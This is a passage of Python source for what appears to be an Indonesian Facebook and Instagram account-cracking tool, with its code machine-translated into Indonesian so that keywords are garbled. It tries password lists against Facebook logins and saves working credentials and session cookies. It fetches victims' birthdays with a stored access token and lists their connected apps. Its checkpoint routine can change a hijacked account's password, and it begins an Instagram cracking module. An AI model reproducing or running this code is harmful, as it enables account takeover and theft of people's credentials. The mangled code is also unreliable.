		global ok,cp,loop
		warna = random.choice([M, H, K, B, U, O, P, J])
		sys.stdout.write('\r'+warna+'•\x1b[1;96m [crack] %s/%s [%sOK%s:%s%s%s]-[%sCP%s:%s %s%s]'%(loop,len(self.id),H,M,H,len(ok),O,K,M,K,len(cp),O)),
		sys.stdout.flush()
		mencoba:
			untuk pw dalam manual:
				pw = pw.bawah()
				ses = permintaan.Sesi()
				ua = random.choice(["Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[ FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]","Mozilla/5.0 (Linux; Android 4.4.4; en-au; SAMSUNG SM-N915G Build/KTU84P) AppleWebKit/537.36 (KTHML, seperti Gecko) Version/2.0 Chrome/34.0.1847.76 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JZO54K) AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/27.0.87.90 Mobile Safari/ 537.36 NokiaBrowser/1.0,gzip(gfe)",,"Mozilla/5.0 (Linux; U; Android 4.4.2; zh-CN; HUAWEI MT7-TL00 Build/HuaweiMT7-TL00) AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/ 4.0 Chrome/40.0.2214.89 UCBrowser/11.3.8.909 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 10;M2006C3MG) AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/81.0.4044.138 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 7.0; SM-G930VC Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36"])
				headers_ = {"Host":"m.facebook.com","upgrade-insecure-requests":"1","user-agent":ua,"accept":"text/html,application/xhtml+xml, application/xml;q=0.9,image/avif,image/webp,image/apng,*[disisipkan oleh cython untuk menghindari komentar lebih dekat]/[dimasukkan oleh cython untuk menghindari komentar dimulai]*;q=0.8,application/signed- exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin"," sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/ ","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"}
				p = ses.get('https://m.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F', headers=headers_).text
				dataa = {"lsd":re.search('name="lsd" value="(.*?)"', str(p)).group(1),"jazoest":re.search('name= "jazoest" value="(.*?)"', str(p)).group(1),"uid":user,"flow":"login_no_pin","pass":pw,"next":" https://developers.facebook.com/tools/debug/accesstoken/"}
				_headers = {"Host":"m.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https:// m.facebook.com","content-type":"application/x-www-form-urlencoded","user-agent":"Mozilla/5.0 (Linux; Android 4.4.4; en-au; SAMSUNG SM- N915G Build/KTU84P) AppleWebKit/537.36 (KTHML, seperti Gecko) Versi/2.0 Chrome/34.0.1847.76 Mobile Safari/537.36","accept":"text/html,application/xhtml+xml,application/xml;q=0.9 ,image/avif,image/webp,image/apng,*[disisipkan oleh cython untuk menghindari komentar lebih dekat]/[disisipkan oleh cython untuk menghindari komentar dimulai]*;q=0.8,application/signed-exchange;v=b3;q =0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/ index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F","accept-encoding":"gzip, deflate br","accept-language":"en-GB ,en-US;q=0.9,en;q=0.8"}
				po = ses.post("https://m.facebook.com/login/device-based/validate-password/?shbl=0", data = dataa, headers=_headers, allow_redirects = False)
				jika 'c_user' di ses.cookies.get_dict():
					mencoba:
						kukis=";".join([key+"="+nilai untuk kunci,nilai dalam ses.cookies.get_dict().items()])
						romz = buka('data/token.txt', 'r').read()
						lahir = request.get(f"https://graph.facebook.com/{user}?fields=birthday&access_token={romz}").json()['birthday']
						hari, bulan, tahun = lahir.split('/')
						bulan = bulan12[bulan]
						print ('\r %s*--> %s %s %s %s %s %s '%(H,pengguna,pw,hari,bulan,tahun,kukis))
						os.popen("play-audio dapet.mp3")
						ok.append("%s %s %s %s %s %s "%(pengguna,pw,hari,bulan,tahun,kukis))
						open('OK/%s.txt' %(waktu), 'a').write(" *--> %s %s %s %s %s %s \n"%(user,pw ,hari,bulan,tahun,kukis))
						cek_apk(kukis)
						merusak
					kecuali (KeyError, IOError):
						hari = ''
						bulan = ''
						tahun = ''
					kecuali:
						lulus
					print ('\r %s*--> %s %s %s '%(H,pengguna,pw,kukis))
					os.popen("play-audio dapet.mp3")
					ok.append('%s %s %s'%(pengguna,pw,kukis))
					open('OK/%s.txt'%(waktu), 'a').write(' *--> %s %s %s\n'%(user,pw,kukis))
					cek_apk(kukis)
					merusak
				elif 'checkpoint' di ses.cookies.get_dict():
					mencoba:
						romz = buka('data/token.txt', 'r').read()
						lahir = request.get(f"https://graph.facebook.com/{user}?fields=birthday&access_token={romz}").json()['birthday']
						hari, bulan, tahun = lahir.split('/')
						bulan = bulan12[bulan]
						print ('\r %s*--> %s %s ◊ %s %s %s '%(K,pengguna,pw,hari,bulan,tahun))
						os.popen("play-audio dapet.mp3")
						cp.append("%s %s %s %s %s"%(pengguna,pw,hari,bulan,tahun))
						open('CP/%s.txt' %(waktu), 'a').write(" *--> %s %s %s %s %s\n"%(user,pw,day, bulan tahun))
						merusak
					kecuali (KeyError, IOError):
						hari = ''
						bulan = ''
						tahun = ''
					kecuali:
						lulus
					print ('\r %s*--> %s %s '%(K,pengguna,pw))
					os.popen("play-audio dapet.mp3")
					cp.append('%s %s'%(pengguna,pw))
					open('CP/%s.txt' %(waktu), 'a').write(" *--> %s %s\n"%(user,pw))
					merusak
				lain:
					melanjutkan
			lingkaran += 1
		kecuali request.exceptions.ConnectionError:
			jeda(1)
			lingkaran += 1
			self.mobil(pengguna, manual, **data)

# SELESAI CRACK
ubah_pass = []
pwbaru = []
pwBaru = []
ubahP = []

def hasil(ok,cp):
	os.popen('play-audio data/selesai.mp3')
	jika len(ok) != 0 atau len(cp) != 0:
		print("\n%s√ selesai"%(H))
		print('%s+%s ---------------------------------------- %s+' %(P,M,P))
		print('%s• %sOK%s : %s%s'%(U,H,M,H,str(len(ok))))
		print('%s• %sCP%s : %s%s'%(U,K,M,K,str(len(cp)))))
		print('%s+%s ---------------------------------------- %s+' %(P,M,P))
		jika len(cp)==0:
			keluar()
		lain:
			c = input('\n%s%s%s gunakan pos pemeriksaan detektor? y/t%s > %s'%(U,til,O,M,K))
			jika c =='':
				exit("%s%s Isi yang benar-benar kentod "%(M,til))
			elif c di['Y','y']:
				jalan("\n%s•%s Mode pesawatkan terlebih dahulu 5 detik "%(U,O))
				pw=input("%s%s%s ubah sandi akun satu tab? y/t %s> %s"%(U,til,O,M,K))
				jika pw =='':
					print("%s%s isi yg benar-benar kentod "%(M,til))
				elif pw di['y','Y']:
					ubah_pass.append("ubah_sandi")
					pw2=input("%s%s%s masukan sandi %s> %s"%(U,til,O,M,K))
					jika len(pw2) <= 5:
						print("%s%s sandi minimal 6 karakter "%(M,til))
					lain:
						pwbaru.append(pw2)
				nomor=0
				untuk fb di cp:
					akun = fb.replace("\n","")
					ngecek = akun.split(" ")
					nomor+1
					print("\n%s%s.%s login akun %s> %s%s"%(H,str(nomor),O,M,K,akun.replace(" *--> ","" )));jeda(0.07)
					mencoba:
						mengecek(ngecek[0].replace(" *--> ",""), ngecek[1])
					kecuali request.exceptions.ConnectionError:
						sys.stdout.write("\r%s• tidak ada koneksi "%(M)),
						sys.stdout.flush();jeda(1)
						lulus
					kecuali:
						lulus
				print("\n%s%s%s Selesai mengecek akun"%(U,til,O));jeda(0.07)
				os.popen('play-audio data/cek.mp3')
				input('%s%s%s [%s Masuk%s ] '%(U,til,O,U,O))
				pilihan().menu()
			elif c di['t','T']:
				KELUAR()
			lain:
				exit("%s%s isi yg benar-benar kentod "%(M,til))
	lain:
		exit(f"\n{M}{til} Ops... tidak mendapatkan hasil :(")

#CEK APLIKASI
def cek_apk(kukis):
	sesi = permintaan.Sesi()
	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":"noscript=1;"+kukis}).text
	sop = bs4.BeautifulSoup(w,"html.parser")
	x = sop.find("form",method="post")
	game = [i.text for i in x.find_all("h3")]
	mencoba:
		untuk saya dalam jangkauan(len(permainan)):
			print ("\r %s%s. %s%s"%(P,i+1,H,game[i].replace("Ditambahkan pada"," Ditambahkan pada")))
	kecuali AttributeError:
		print ("\r %s• cookie tidak valid"%(M))
	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":"noscript=1;"+kukis}).text
	sop = bs4.BeautifulSoup(w,"html.parser")
	x = sop.find("form",method="post")
	game = [i.text for i in x.find_all("h3")]
	mencoba:
		untuk saya dalam jangkauan(len(permainan)):
			print ("\r %s%s. %s%s"%(P,i+1,M,game[i].replace("Kedaluwarsa"," Kedaluwarsa")))
	kecuali AttributeError:
		print ("\r %s• cookie tidak valid"%(M))

# DETEKTOR CEKPOINT
def file_cp():
	dirs = os.listdir('CP')
	print ("\n%s•%s [%s pilih hasil crack yg tersimpan untuk cek opsi %s]\n"%(U,O,U,O))
	untuk file di dirs:
		print("%s•%s> %s%s"%(U,M,K,file));jeda(0.07)
	mencoba:
		print("\n%s%s%s File Masuk [ cth%s: %s%s.txt%s ]"%(U,til,O,M,K,waktu,O))
		opsi()
	kecuali IOError:
		print ('%s• file tidak ada'%(M))
		KELUAR()

def opsi():
	CP = ("CP/")
	romi = input("%s%s%s Nama file %s> %s"%(U,til,O,M,K))
	jika romi == "":
		print("%s%s isi yang benar"%(M,til));jeda(2)
		opsi()
	mencoba:
		file_cp = buka(CP+romi, "r").readlines()
	kecuali IOError:
		exit("\n%s%s nama file %s tidak tersedia"%(M,til,romi))
	jalan("%s•%s Mode pesawatkan terlebih dahulu 5 detik "%(U,O))
	pw=input("\n%s%s%s ubah sandi pada akun one tab? y/t %s> %s"%(U,til,O,M,K))
	jika pw di['y','Y']:
		ubah_pass.append("ubah_sandi")
		pw2 = input("%s%s%s masukan sandi %s> %s"%(U,til,O,M,K))
		jika len(pw2) <= 5:
			print("%s• sandi minimal 6 karakter "%(M))
		lain:
			pwbaru.append(pw2)
	print("\n %s# %s---------------------------------------- %s#"%(P,M,P));jeda(2)
	print ("%s%s%s total akun %s: %s%s "%(U,til,O,M,K,str(len(file_cp)))))
	print(" %s# %s---------------------------------------- %s #"%(P,M,P));jeda(2)
	nomor = 0
	untuk fb di file_cp:
		akun = fb.replace("\n","")
		ngecek = akun.split(" ")
		nomor+1
		print("\n%s%s.%s login akun %s> %s%s"%(H,str(nomor),O,M,K,akun.replace(" *--> ","" )));jeda(0.07)
		mencoba:
			mengecek(ngecek[0].replace(" *--> ",""), ngecek[1])
		kecuali request.exceptions.ConnectionError:
			melanjutkan
	print("\n%s%s%s Selesai mengecek akun"%(U,til,O));jeda(0.07)
	os.popen('play-audio data/cek.mp3')
	input('%s%s%s [%s Masuk%s ] '%(U,til,O,U,O))
	pilihan().menu()
	
data = {}
data2 = {}

def mengecek(pengguna,pw):
	loop global,ubah_pass,pwbaru
	sesi=permintaan.Sesi()
	url = "https://mbasic.facebook.com"
	session.headers.update({"Host":"mbasic.facebook.com","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp, image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","accept-encoding":"gzip, deflate","accept-language":"id-ID, id;q=0.9","referer":"https://mbasic.facebook.com/","user-agent":"Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv ) AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]"})
	soup=bs4.BeautifulSoup(session.get(url+"/login/?next&ref=dbl&fl&refid=8").text,"html.parser")
	link=soup.find("form",{"method":"post"})
	untuk x dalam sup("input"):
		data.update({x.get("name"):x.get("value")})
	data.update({"email":user,"pass":pw})
	urlPost=session.post(url+link.get("action"),data=data)
	response=bs4.BeautifulSoup(urlPost.text, "html.parser")
	jika "c_user" di session.cookies.get_dict():
		jika "Akun Anda Tidak Terkunci" di urlPost.text:
			print("\r%s• akun terkunci sesi baru"%(M))
		lain:
			print("\r%s• akun tidak checkpoint, silahkan anda login "%(H))
			os.popen('play-audio dapet.mp3')
			open('OK/%s.txt'%(waktu), 'a').write(" *--> %s %s\n" % (user,pw))
	elif "pos pemeriksaan" di session.cookies.get_dict():
		coki = (";").join([ "%s=%s" % (kunci, nilai) untuk kunci, nilai dalam session.cookies.get_dict().items() ])
		title=re.findall("\<title>(.*?)<\/title>",str(respons))
		link2=response.find("form",{"method":"post"})
		listInput=['fb_dtsg','jazoest','checkpoint_data','kirim[Lanjutkan]','nh']
		untuk x sebagai tanggapan("masukan"):
			jika x.get("nama") di listInput:
				data2.update({x.get("name"):x.get("value")})
		an=session.post(url+link2.get("action"),data=data2)
		response2=bs4.BeautifulSoup(an.text,"html.parser")
		cek=[cek.text untuk cek di response2.find_all("option")]
		nomor = 0
		print("\r%s%s%s terdapat %s%s%s opsi %s:"%(U,til,O,P,str(len(cek)),O,M));jeda(0.07 )
		jika(len(cek)==0):
			jika "Lihat detail login yang ditampilkan. Ini Anda?" dalam judul:
				jika "ubah_sandi" di ubah_pass:
					dat,dat2={},{}
					tapi=["kirim[Ya]","nh","fb_dtsg","jazoest","checkpoint_data"]
					untuk x sebagai tanggapan("masukan"):
						jika x.get("nama") di tapi:
							dat.update({x.get("name"):x.get("value")})
					ubahPw=session.post(url+link2.get("action"),data=dat).text
					resUbah=bs4.BeautifulSoup(ubahPw,"html.parser")
					link3=resUbah.find("form",{"method":"post"})
					but2=["kirim[T ext]","nh","fb_dtsg","jazoest"]
					if "Buat Kata Sandi Baru" di re.findall("\<title>(.*?)<\/title>",str(ubahPw)):
						untuk b di resUbah("input"):
							dat2.update({b.get("name"):b.get("value")})
						dat2.update({"password_new":"".join(pwbaru)})
						an=session.post(url+link3.get("action"),data=dat2)
						coki = (";").join([ "%s=%s" % (kunci, nilai) untuk kunci, nilai dalam session.cookies.get_dict().items() ])
						print("\r%s%s akun satu tab, sandi berhasil di ubah \n *--> %s %s %s "%(H,til,user,pwbaru[0],coki))
						os.popen('play-audio dapet.mp3')
						open('OK/%s.txt' %(waktu), 'a').write(" *--> %s %s %s\n" % (user,pwbaru[0],coki))
						cek_apk(coki)
				lain:
					print("\r%s%s akun one tab, silahkan anda login "%(H,til))
					os.popen('play-audio dapet.mp3')
					open('OK/%s.txt' %(waktu), 'a').write(" *--> %s %s %s\n" % (user,pw,coki))
					cek_apk(coki)
			elif "Masukkan Kode Masuk untuk Melanjutkan" di re.findall("\<title>(.*?)<\/title>",str(response)):
				print("\r%s• akun terpasang autentikasi dua faktor "%(M))
			lain:
				print("%s%s terjadi kesalahan"%(M,til))
		lain:
			jika "c_user" di session.cookies.get_dict():
				print("\r%s• akun tidak checkpoint, silahkan anda login "%(H))
				os.popen('play-audio dapet.mp3')
				open('OK/%s.txt' %(waktu), 'a').write(" *--> %s %s\n" % (user,pw))
		untuk opsi dalam jangkauan(len(cek)):
			nomor +=1
			jalan (" %s%s. %s%s"%(P,str(number),K,cek[opsi]))
	elif "login_error" di str(respons):
		oh = run.find("div",{"id":"login_error"}).find("div").text
		print("%s• %s"%(M,oh))
	lain:
		print("%s%s login gagal, silahkan cek kembali id ​​dan kata sandi"%(M,til))
		
#HAPUS HASIL
def hapus_hasil():
	os.system('rm -rf CP/*.txt && OK/*.txt')
	os.system('rm -rf IG/*.txt')
	cetak ('');jeda(2)
	jalan (H+' berhasil menghapus crack ');jeda(2)
	pilihan().menu()
	
#CEK HASIL
def hasill():
	print ("\n%s%s%s 01 %sCek hasil akun %sOK "%(U,til,P,O,H))
	print ("%s%s%s 02 %sCek hasil akun %sCP "%(U,til,P,O,K))
	print ("%s%s%s 00 %sKembali "%(U,til,M,O))
	
def cek_cek(rom):
	jika rom di['']:
		print('\n%s%s isi yang benar'%(M,til));jeda(2)
		pilihan().menu()
	elif rom di['1','01']:
		hasil_fb()
	elif rom di['2','02']:
		hasil_igehh()
	elif rom di['03','3']:
		hapus_hasil()
	elif rom di['0','00']:
		pilihan().menu()
	lain:
		print('\n%s%s isi yang benar'%(M,til));jeda(2)
		pilihan().menu()
		
#CEK HASIL FACEBOOK
def hasil_fb():
	hasill()
	l = input('\n%s#%s Pilih %s> %s '%(P,O,M,K))
	jika saya di['']:
		print('\n%s%s isi yang benar'%(M,til));jeda(2)
		Tidak bisa()
	elif l di['1','01']:
		dirs = os.listdir('OK')
		print ("\n%s•%s [%s hasil crack yang tersimpan %s]\n"%(U,O,U,O))
		untuk file di dirs:
			print("%s•%s> %s%s"%(U,M,H,file));jeda(0.07)
		mencoba:
			file = input("\n%s•%s masukan file %s:%s "%(U,O,M,H));jeda(0.2)
			jika file di['']:
				exit("%s• isi yang benar-benar kentod"%(M))
			totalok = buka('OK/%s'%(file)).read().splitlines()
		kecuali (KeyError, IOError):
			print("%s%s file tidak ada "%(M,til))
		nm_file = ('%s'%(file)).ganti('-', ' ')
		file_nm = nm_file.replace('.txt', '')
		print(" %s# %s---------------------------------------- %s #"%(P,M,P));jeda(2)
		jalan("%s•%s hasil tanggal%s : %s%s %stotal %s: %s%s"%(U,O,M,H,file_nm,O,M,H,len(totalok)) )
		print(" %s# %s---------------------------------------- %s #%s"%(P,M,P,H));jeda(2)
		os.system('cat OK/%s'%(file))
		print(" %s# %s---------------------------------------- %s #"%(P,M,P));jeda(2)
		keluar('\n')
	elif l di['2','02']:
		dirs = os.listdir('CP')
		print ("\n%s•%s [%s hasil crack yang tersimpan %s]\n"%(U,O,U,O))
		untuk file di dirs:
			print("%s•%s> %s%s"%(U,M,K,file));jeda(0.07)
		mencoba:
			file = input("\n%s•%s masukan file %s:%s "%(U,O,M,K));jeda(0.2)
			jika file di['']:
				exit("%s• isi yang benar-benar kentod"%(M))
			totalcp = buka('CP/%s'%(file)).read().splitlines()
		kecuali (KeyError, IOError):
			print("%s%s file tidak ada "%(M,til))
		nm_file = ('%s'%(file)).ganti('-', ' ')
		file_nm = nm_file.replace('.txt', '')
		print(" %s# %s---------------------------------------- %s #"%(P,M,P));jeda(2)
		jalan("%s•%s hasil tanggal%s : %s%s %stotal%s : %s%s"%(U,O,M,K,file_nm,O,M,K,len(totalcp)) )
		print(" %s# %s---------------------------------------- %s #%s"%(P,M,P,K));jeda(2)
		os.system('cat CP/%s'%(file))
		print(" %s# %s---------------------------------------- %s #"%(P,M,P));jeda(2)
		keluar('\n')
	elif l di['0','00']:
		pilihan().menu()
	lain:
		print('\n%s%s isi yang benar'%(M,til));jeda(2)
		pilihan().menu()
		
#CEK HASIL IGEH
def hasil_igehh():
	mencetak('')
	untuk saya di os.listdir('IG'):
		print("%s•%s> %s%s"%(U,M,J,i));jeda(0.07)
	mencoba:
		c=input("\n%s•%s masukan file %s:%s "%(U,O,M,K))
		jika c di['']:
			exit("\n%s• isi yang benar-benar kentod"%(M))
		g=buka("IG/%s"%(c)).read().splitlines()
	kecuali FileNotFoundError:
		exit("\n%s• file tidak tersedia"%(M))
	xx=c.split("-")
	xc=xx[0]
	print(" %s# %s---------------------------------------- %s #"%(P,M,P));jeda(2)
	print('%s%s%s Total akun %s: %s%s '%(U,til,O,M,H,len(g)))
	print(" %s# %s---------------------------------------- %s #"%(P,M,P));jeda(2)
	untuk s dalam g:
		usr=s.split("|")[0]
		pwd=s.split("|")[1]
		fol=s.split("|")[2]
		ful=s.split("|")[3]
		jika xc=="CP":
			print(f"""{J}╔══[ {K}Pos pemeriksaan                      
{J}║══[ {K}Nama Pengguna {M}> {K}{usr}{C}
{J}║══[ {K}Sandi {M}> {K}{pwd}{C}
{J}║══[ {K}Pengikut {M}> {K}{fol}{C}
{J}╚══[ {K}Mengikuti {M}> {K}{ful}{C}
			""");jeda(0.05)
		lain:
			print(f"""{J}╔══[ {H}Berhasil                      
{J}║══[ {H}Nama Pengguna {M}> {H}{usr}{C}
{J}║══[ {H}Sandi {M}> {H}{pwd}{C}
{J}║══[ {H}Pengikut {M}> {H}{fol}{C}
{J}╚══[ {H}Mengikuti {M}> {H}{ful}{C}
			""");jeda(0.05)

#---------------------------------------------------------#
#---{ CRACK INSTAGRAM }---#
#----------------------------------------------#
hari=datetime.now().strftime("%d-%b-%Y")
nyMnD = 5
nyMxD = 10

insta_log='https://www.instagram.com/accounts/login/?force_classic_login=&'
url='https://www.instagram.com'

USN="Mozilla/5.0 (Linux; Android 10; SM-G973F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/86.0.4240.198 Mobile Safari/537.36 Instagram 166.1.0.42.245 Android (29/10; 420dpi; 1080x2042; samsung; SM-G973F; melampaui1; exynos9820; en_GB; 256099204)"

dalam=[]
eksternal=[]
sukses=[]
pos pemeriksaan=[]
lingkaran = 0
berikut=[]
s=permintaan.Sesi()

mencoba:
    # python 2
	urllib_quote_plus = urllib.quote
kecuali:
    # python 3
	urllib_quote_plus = urllib.parse.quote_plus

def cekAPI(cookie):
	pengguna=buka('.namapengguna','r').read()
	mencoba:
		c=requests.get("https://www.instagram.com/%s/?__a=1"%(user),cookies={'cookie':cookie},headers={"user-agent":USN })
		i=c.json()["graphql"]["pengguna"]
		nama=i["nama_lengkap"]
		pengikut=i["edge_followed_by"]["count"]
		following=i["edge_follow"]["count"]
		external.append(f'{nama}|{pengikut}|{mengikuti}')
	kecuali ValueError:
		print(f'{M} ! Instagram Checkpoint');jeda(4)
		os.remove('.kukis.log')
		os.remove('.namapengguna')
		KELUAR()
	kembalikan eksternal, pengguna

def checkin():
	mencoba:
		kuki=buka('.kukis.log','r').read()
	kecuali FileNotFoundError:
		Gabung()
	mis,pengguna=cekAPI(kuki)
	cookie={'kue':kuki}
	instagram(ex,pengguna,cookie).menu()

def masuk():
	eksternal global
	mencoba:
		os.sistem('hapus')
		catet_req = ('# Login dengan akun instagram anda dan pastikan akun bersifat publik. Jika login checkpoint wajib gunakan akun baru, buat akun baru lewat browser chrome')
		requ = rich.markdown.Markdown(catet_req, style='green')
		rich.console.Console().print(requ)
		us=input('%s%s %namapengguna%s > %s'%(U,til,O,M,K))
		pw=stdiomask.getpass(prompt='%s%s %spassword%s > %s'%(U,til,O,M,K))
	kecuali KeyboardInterrupt:
		exit('%s ! Terhenti '%(M))
		
	x=instagramAPI(kami,pw).loginAPI()
	jika x.get('status')=='berhasil':
		buka('.namapengguna','a').tulis(kami)
		buka('.kukis.log','a').write(x.get('cookie'))
		cookie={'cookie':x.get('cookie')}
		print ('\n%s%s Login berhasil '%(H,til));jeda(2)
		mendaftar()
	elif x.get('status')=='pos pemeriksaan':
		exit ('\n%s%s Akun terkena sesi '%(M,til));jeda(2)
	lain:
		exit ('\n%s%s Login gagal, silahkan coba lagi '%(M,til));jeda(2)

def User_Agent():
	dpi_ponsel = [
		'133','320','515','160','640','240','120'
		'800','480','225','768','216','1024']
	model_ponsel = [
		'Nokia 2.4','HUAWEI','Galaxy',
		'Ponsel Cerdas Tidak Terkunci', 'Nexus 6P',
		'Ponsel', 'Xiaomi',
		'samsung', 'OnePlus']
	pxl_ponsel = [
		'623x1280','700x1245','800x1280',
		'1080x2340','1320x2400','1242x2688']
	i_versi = [
		'114.0.0.20.2','114.0.0.38.120',
		'114.0.0.20.70','114.0.0.28.120',
		'114.0.0.0.24','114.0.0.0.41']
	User_Agent = f'Instagram '+random.choice(i_version)+' Android (30/3.0; '+random.choice(dpi_phone)+'dpi; '+random.choice(pxl_phone)+'; huawei/google; '+ random.choice(model_phone)+'; pemancing; pemancing; en_US)'
	kembalikan User_Agent

def user_agent():
	resolusi = ['720x1280', '320x480', '480x800', '1024x768', '1280x720', '768x1024', '480x320']
	versi = ['GT-N7000', 'SM-N9000', 'GT-I9220', 'GT-I9100']
	dpis = ['120', '160', '320', '240']
	ver = random.choice(versi)
	dpi = acak.pilihan(dpis)
	res = random.choice(resolusi)
	kembali (
		'Instagram 4.{}.{} '
		'Android ({}/{}.{}.{}; {}; {}; samsung; {}; {}; smdkc210; en_US)'
	).format(
		acak.randint(1, 2),
		acak.randint(0, 2),
		acak.randint(10, 11),
		acak.randint(1, 3),
		acak.randint(3, 5),
		acak.randint(0, 5),
		dpi,
		soal,
		ver,
		ver,
	)

def user_agentAPI():
	APP_VERSION = "136.0.0.34.124"
	VERSION_CODE = "208061712"
	PERANGKAT = {
		"one_plus_7": {"app_version": APP_VERSION,"android_version": "29","android_release": "10.0","dpi": "420dpi","resolusi": "1080x2340","produsen": "OnePlus" ,"perangkat": "GM1903","model": "OnePlus7","cpu": "qcom","version_code": VERSION_CODE},
		"one_plus_3": {"app_version": APP_VERSION,"android_version": "28","android_release": "9.0","dpi": "420dpi","resolusi": "1080x1920","produsen": "OnePlus" ,"perangkat": "ONEPLUS A3003","model": "OnePlus3","cpu": "qcom","version_code": VERSION_CODE},
		"samsung_galaxy_s7": {"app_version": APP_VERSION,"android_version": "26","android_release": "8.0","dpi": "640dpi","resolusi": "1440x2560","produsen": "samsung" ,"perangkat": "SM-G930F","model": "herolte","cpu": "samsungexynos8890","version_code": VERSION_CODE},
		"huawei_mate_9_pro": {"app_version": APP_VERSION,"android_version": "24","android_release": "7.0","dpi": "640dpi","resolusi": "1440x2560","produsen": "HUAWEI" ,"perangkat": "LON-L29","model": "HWLON","cpu": "hi3660","version_code": VERSION_CODE},
		"samsung_galaxy_s9_plus": {"app_version": APP_VERSION,"android_version": "28","android_release": "9.0","dpi": "640dpi","resolusi": "1440x2560","produsen": "samsung" ,"perangkat": "SM-G965F","model": "star2qltecs","cpu": "samsungexynos9810","version_code": VERSION_CODE},
		"one_plus_3t": {"app_version": APP_VERSION,"android_version": "26","android_release": "8.0","dpi": "380dpi","resolusi": "1080x1920","produsen": "OnePlus" ,"perangkat": "ONEPLUS A3010","model": "OnePlus3T","cpu": "qcom","version_code": VERSION_CODE},
		"lg_g5": {"app_version": APP_VERSION,"android_version": "23","android_release": "6.0.1","dpi": "640dpi","resolusi": "1440x2392","produsen": " LGE/lge","perangkat": "RS988","model": "h1","cpu": "h1","version_code": VERSION_CODE},
		"zte_axon_7": {"app_version": APP_VERSION,"android_version": "23","android_release": "6.0.1","dpi": "640dpi","resolusi": "1440x2560","produsen": " ZTE","perangkat": "ZTE A2017U","model": "ailsa_ii","cpu": "qcom","version_code": VERSION_CODE},
		"samsung_galaxy_s7_edge": {"app_version": APP_VERSION,"android_version": "23","android_release": "6.0.1","dpi": "640dpi","resolusi": "1440x2560","produsen": " samsung","device": "SM-G935","model": "hero2lte","cpu": "samsungexynos8890","version_code": VERSION_CODE},}
	DEFAULT_DEVICE = random.choice(daftar(DEVICES.keys()))
	versi_aplikasi = PERANGKAT[DEFAULT_DEVICE]['versi_aplikasi']
	android_version = PERANGKAT[DEFAULT_DEVICE]['android_version']
	android_release = PERANGKAT[DEFAULT_DEVICE]['android_release']
	dpi = PERANGKAT[DEFAULT_DEVICE]['dpi']
	resolusi = PERANGKAT[DEFAULT_DEVICE]['resolusi']
	produsen = PERANGKAT[DEFAULT_DEVICE]['produsen']
	perangkat = PERANGKAT[DEFAULT_DEVICE]['perangkat']
	model = PERANGKAT[DEFAULT_DEVICE]['model']
	cpu = PERANGKAT[DEFAULT_DEVICE]['cpu']
	version_code = PERANGKAT[DEFAULT_DEVICE]['version_code']
	USER_AGENT_BASE = f"Instagram {app_version} "+f"Android ({android_version}/{android_release}; "+f"{dpi}; {resolusi}; {produsen}; "+f"{perangkat}; {model}; {cpu}; en_US; {version_code})"
	kembalikan USER_AGENT_BASE

kelas instagramAPI:
	API_URL = 'https://i.instagram.com/api/v1/'
	PERANGKAT_SETTINTS = {'produsen': 'Xiaomi',
		'model': 'HM 1SW',
		'android_version': 18,
		'android_release': '4.3'}
	USER_AGENT = 'Instagram 10.26.0 Android ({android_version}/{android_release}; 320dpi; 720x1280; {produsen}; {model}; armani; qcom; en_US)'.format(**DEVICE_SETTINTS)
	IG_SIG_KEY = '4f8732eb9ba7d1c8e8897a75d6474d4eb3f5279137431b2aafb71fafe2abe178'
	EKSPERIMEN = 'ig_promote_reach_objective_fix_universe, ig_android_universe_video_production, ig_search_client_h1_2017_holdout, ig_android_live_follow_from_comments_universe, ig_android_carousel_non_square_creation, ig_android_live_analytics, ig_android_follow_all_dialog_confirmation_copy, ig_android_stories_server_coverframe, ig_android_video_captions_universe, ig_android_offline_location_feed, ig_android_direct_inbox_retry_seen_state, ig_android_ontact_invite_universe, ig_android_live_broadcast_blacklist, ig_android_insta_video_reconnect_viewers, ig_android_ad_async_ads_universe, ig_android_search_clear_layout_universe, ig_android_shopping_reporting, ig_android_stories_surface_universe, ig_android_verified_comments_universe, ig_android_preload_media_ahead_in_current_reel, android_instagram_prefetch_suggestions_universe,ig_android_reel_viewer_fetch_missing_reels_universe, ig_android_direct_search_share_sheet_universe, ig_android_business_promote_tooltip, ig_android_direct_blue_tab, ig_android_async_network_tweak_universe, ig_android_elevate_main_thread_priority_universe, ig_android_stories_gallery_nux, ig_android_instavideo_remove_nux_comments, ig_video_copyright_whitelist, ig_react_native_inline_insights_with_relay, 